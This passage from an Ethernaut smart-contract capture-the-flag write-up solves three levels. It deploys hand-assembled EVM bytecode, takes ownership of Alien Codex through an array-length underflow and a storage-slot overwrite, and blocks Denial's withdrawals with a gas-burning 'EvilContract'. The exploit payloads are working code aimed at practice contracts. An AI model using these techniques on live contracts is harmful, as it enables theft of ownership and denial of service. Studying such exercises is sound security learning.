</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span><span></span><span class="token" style="color:#d4d4d4">--</span><span class="token" style="color:#d4d4d4">--</span><span class="token" style="color:#d4d4d4">--</span><span class="token" style="color:#d4d4d4">--</span><span class="token" style="color:#d4d4d4">-</span><span>   
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span><span></span><span class="token" style="color:#9cdcfe">PUSH1</span><span> </span><span class="token" style="color:#b5cea8">0x42</span><span> </span><span class="token" style="color:#6a9955">//  our value</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span><span></span><span class="token" style="color:#9cdcfe">PUSH1</span><span> </span><span class="token" style="color:#b5cea8">0x80</span><span> </span><span class="token" style="color:#6a9955">//  memory position</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span><span></span><span class="token" style="color:#9cdcfe">MSTORE</span><span> </span><span class="token" style="color:#6a9955">// stores the 42 into memory location 0x80</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">6</span><span></span><span class="token" style="color:#9cdcfe">PUSH1</span><span> </span><span class="token" style="color:#b5cea8">0x20</span><span> </span><span class="token" style="color:#6a9955">// the length of the value</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">7</span><span></span><span class="token" style="color:#9cdcfe">PUSH1</span><span> </span><span class="token" style="color:#b5cea8">0x80</span><span> </span><span class="token" style="color:#6a9955">// memory position ( again )</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">8</span><span></span><span class="token" style="color:#9cdcfe">RETURN</span><span> </span><span class="token" style="color:#6a9955">// returns (memory position , offset )  so we can calculate memoryPos+offset to get the value !</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">9</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">10</span><span></span><span class="token" style="color:#6a9955">// *10 bytes total*</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">11</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]"><code class="inline-code">PUSH1 VALUE</code> pushes a 1-byte value onto the stack.
<code class="inline-code">MSTORE</code> writes a (u)int256 to memory takes (offset,value) as args</p>
<blockquote>
<p class="chakra-text css-0" node="[object Object]">The ethereum evm is a <a class="chakra-link css-9olwc6" href="https://en.wikipedia.org/wiki/Stack_machine">Stack Machine</a>. args comes from the stack and return values are written into the stack.</p>
</blockquote>
<blockquote>
<p class="chakra-text css-0" node="[object Object]">In fact, Solidity uses the memory area between address zero and address 0x7F for internal purposes, and stores data starting at address 0x80. So initially, free memory starts at 0x80. To keep track of which memory can still be used and which memory areas are already in use <a class="chakra-link css-9olwc6" href="https://leftasexercise.com/2021/09/05/a-deep-dive-into-solidity-contract-creation-and-the-init-code/">A deep-dive into Solidity – contract creation and the init code</a></p>
</blockquote>
<p class="chakra-text css-0" node="[object Object]">Now we have to write opcodes for contract initialization. We should know how contract initialization works under the hood. First the bytes sent in the transaction can be divided into two <em>initialization opcodes</em> and <em>runtime opcodes</em>. The <em>initialization opcodes</em> are the one responsible for the creation of the contract by executing the constructor and copying the <em>runtime opcodes</em> into the memory because the <em>runtime opcodes</em> is the instruction that will be run in the contract (functions,modifiers etc). What we have defined above is the <em>runtime opcodes</em>. Let&#x27;s define our <em>initilization opcodes</em></p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span class="token" style="color:#6a9955">// copy the runtime code into memory with codecopy(length,offset,dest)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span><span></span><span class="token" style="color:#9cdcfe">PUSH</span><span> </span><span class="token" style="color:#b5cea8">0x0a</span><span> </span><span class="token" style="color:#6a9955">// 10 bytes of runtime opcodes</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span><span></span><span class="token" style="color:#9cdcfe">PUSH</span><span> </span><span class="token" style="color:#b5cea8">0x0c</span><span> </span><span class="token" style="color:#6a9955">// 13 bytes of initialization opcodes ( I didn&#x27;t guess it I have actually calculated after writing the whole thing )</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span><span></span><span class="token" style="color:#9cdcfe">PUSH</span><span> </span><span class="token" style="color:#b5cea8">0x00</span><span> </span><span class="token" style="color:#6a9955">// memory offset</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span><span></span><span class="token" style="color:#9cdcfe">CODECOPY</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">6</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">7</span><span></span><span class="token" style="color:#6a9955">// the initialization will stop at STOP or RETURN. for our case I will return the offset + length of the runtime code</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">8</span><span></span><span class="token" style="color:#9cdcfe">PUSH</span><span> </span><span class="token" style="color:#b5cea8">0x0a</span><span> 
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">9</span><span></span><span class="token" style="color:#9cdcfe">PUSH</span><span> </span><span class="token" style="color:#b5cea8">0x00</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">10</span><span></span><span class="token" style="color:#9cdcfe">RETURN</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">11</span>
</span></code></div></pre>
<div class="css-17l36zw"></div>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Exploitation</span></p>
<p class="chakra-text css-0" node="[object Object]">To craft our payload we will convert the instruction to pure bytes. That&#x27;s fairly easy. We view <a class="chakra-link css-9olwc6" href="https://www.ethervm.io/#02">EtherVM</a> to view the bytes of each instruction and for the values we discard the <code class="inline-code">0x</code> (<code class="inline-code">0x0a</code> =&gt; <code class="inline-code">0a</code>)</p>
<pre><code class="inline-code">                   [ Initialization bytes    |    Runtime bytes ]
</code></pre>
<p class="chakra-text css-0" node="[object Object]">So our final payload : <code class="inline-code">600a600c600039600a6000f3604260805260206080f3</code></p>
<p class="chakra-text css-0" node="[object Object]">We open the console to create our contract and set it as the solver.</p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span class="token" style="color:#569CD6">const</span><span> tx </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#c586c0">await</span><span> web3</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">eth</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">sendTransaction</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">{</span><span class="token" style="color:#c586c0">from</span><span class="token" style="color:#d4d4d4">:</span><span>player</span><span class="token" style="color:#d4d4d4">,</span><span class="token literal-property" style="color:#9cdcfe">data</span><span class="token" style="color:#d4d4d4">:</span><span class="token" style="color:#ce9178">&#x27;600a600c600039600a6000f3604260805260206080f3&#x27;</span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span><span></span><span class="token" style="color:#c586c0">await</span><span> contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">setSolver</span><span class="token" style="color:#d4d4d4">(</span><span>tx</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">contractAddress</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]">Challenge solved ✅</p>
<h2 class="chakra-heading css-1uc67dn" id="alien codex">Alien Codex</h2>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Challenge description</span></p>
<p class="chakra-text css-0" node="[object Object]">You&#x27;ve uncovered an Alien contract. Claim ownership to complete the level.</p>
<pre><code class="inline-code">Understanding how array storage works
Understanding ABI specifications
Using a very underhanded approach
</code></pre>
<div class="css-17l36zw"></div>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Analysis</span></p>
<p class="chakra-text css-0" node="[object Object]">First look at the contract code nothing comes to my mind. The Ownable contract is actually <code class="inline-code">openzeppelin</code> Ownable and I looked into its source code and the only useful thing I got is it saves <code class="inline-code">address owner</code>.</p>
<p class="chakra-text css-0" node="[object Object]">Looking back to the challenge description I noticed the array in storage part. Dynamic structures have a length property that takes a normal position in the stack and from it we can look for the array data in the stack. We have to use <code class="inline-code">keccack265(length_position)</code> to find the first slot of array data.</p>
<p class="chakra-text css-0" node="[object Object]">So how can we -----
<span class="chakra-text css-gv9qss">Exploitation</span> that ?</p>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138017/86f1f291d81ff664dbe3c9afd11c315bb31de2e0a3283a0f8d964b43e9bf44eb_tcxxpp.png" alt="Alien Codex method" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Alien Codex method</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">We got 2 slots taken from the whole storage. If we make the length of the array takes up the whole storage then we can overwrite any value of it. <code class="inline-code">retract</code> allows that, the <code class="inline-code">array.length</code> is <code class="inline-code">uint256</code>.</p>
<p class="chakra-text css-0" node="[object Object]">After taking up the whole storage we need to find the position of the owner variable.
Our current storage layout is.</p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span class="token" style="color:#6a9955">/* STORAGE
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span>* [0]: contract + owner , 
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span>* [1]: codex
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span>* keccak256(1) : codex[0]
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span>*       ..
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">6</span>*        ..
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">7</span>* [2^256]: 0x000000000
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">8</span><span class="token" style="color:#6a9955">*/</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">9</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]">We want to overlap and get to slot[0] to set it. We can calculate the index of that element by <code class="inline-code">2^256 - keccack(256)(1) +1</code></p>
<div class="css-17l36zw"></div>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Exploitation</span></p>
<p class="chakra-text css-0" node="[object Object]">first we call the <code class="inline-code">retract</code> to set the array length to max.</p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span class="token" style="color:#c586c0">await</span><span> contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">retract</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]">then we get our payload, here is a utils contract.</p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span>contract </span><span class="token" style="color:#4ec9b0">Utils</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span> 
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">getNumber</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> pure </span><span class="token" style="color:#dcdcaa">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">uint256</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span><span>      uint256 x </span><span class="token" style="color:#d4d4d4">=</span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span>        
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">6</span><span>        </span><span class="token" style="color:#6a9955">// return x-1 - uint256(keccak256(abi.encodePacked(uint256(1))))+1;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">7</span>        
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">8</span><span>        </span><span class="token" style="color:#c586c0">return</span><span> x </span><span class="token" style="color:#d4d4d4">-</span><span> </span><span class="token" style="color:#dcdcaa">uint256</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">keccak256</span><span class="token" style="color:#d4d4d4">(</span><span>abi</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">encodePacked</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">uint256</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">1</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">9</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">10</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">11</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]">We check if we got it right 😄</p>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138010/03ed7019523687b6195b1e2824212ccf9c27300ff053773c2f5b93ea5b79580d_boj4jy.png" alt="Alien Codex - check" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Alien Codex - check</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">no need to be puzzled we know what it is it&#x27;s the contact value +</p>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138013/9faab8cbd57b86461622fa7e3aad8dab64aed6c6d4a52a4ee19088857b840d21_pzx1am.png" alt="Alien Codex - Level address" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Alien Codex - Level address</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">So our payload should be</p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-Js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span>0x00000000000000000000000184e7a3679A82C2766Ff8382862ab883FF9460307
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span>0x000000000000000000000001YOUR_ADDRESS_HERE
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]">Challenge solved ✅</p>
<h2 class="chakra-heading css-1uc67dn" id="denial">Denial</h2>
<blockquote>
<p class="chakra-text css-0" node="[object Object]">There is a way to using <code class="inline-code">addr.call{value:x}(&quot;&quot;)</code>, only that it forwards all remaining gas and opens up the ability to perform more expensive actions ( and it returns a failure code instead of propagating the error )  ~ Solidity docs</p>
</blockquote>
<p class="chakra-text css-0" node="[object Object]">That&#x27;s all we need. So I lost quite bit of time looking for a way to reach the call stack depth limit ( which is 1024 ). But it was more the hard way of doing things.  What if we didn&#x27;t leave the caller contract enough gas to transfer the 1% of the owner ? Yes that&#x27;s really it !</p>
<div class="css-17l36zw"></div>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">-----
<span class="chakra-text css-gv9qss">Exploitation</span>ation</span></p>
<p class="chakra-text css-0" node="[object Object]">Our evil contract, btw don&#x27;t try to run it on Remix as it will crash instead use truffle console or something similar to try it</p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span>contract </span><span class="token" style="color:#4ec9b0">EvilContract</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span> 
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span><span>    </span><span class="token" style="color:#dcdcaa">receive</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> external payable </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span><span>        </span><span class="token" style="color:#c586c0">while</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569cd6">true</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>  </span><span class="token" style="color:#6a9955">// the line that crashed my whole VM</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">6</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]">Challenge solved ✅</p>
<blockquote>
<p class="chakra-text css-0" node="[object Object]">This level demonstrates that external calls to unknown contracts can still create denial of service attack vectors if a fixed amount of gas is not specified.
If you are using a low level call to continue executing in the event an external call reverts, ensure that you specify a fixed gas stipend. For example call.gas(100000).value().</p>
</blockquote>
<p class="chakra-text css-0" node="[object Object]">Typically one should follow the checks-effects-interactions pattern to avoid reentrancy attacks, there can be other circumstances (such as multiple external calls at the end of a function) where issues such as this can arise.</p>
<p class="chakra-text css-0" node="[object Object]">Note: An external CALL can use at most 63/64 of the gas currently available at the time of the CALL. Thus, depending on how much gas is required to complete a transaction, a transaction of sufficiently high gas (i.e. one such that 1/64 of the gas is capable of completing the remaining opcodes in the parent call) can be used to mitigate this particular attack.</p>
<h2 class="chakra-heading css-1uc67dn" id="shop">Shop</h2>
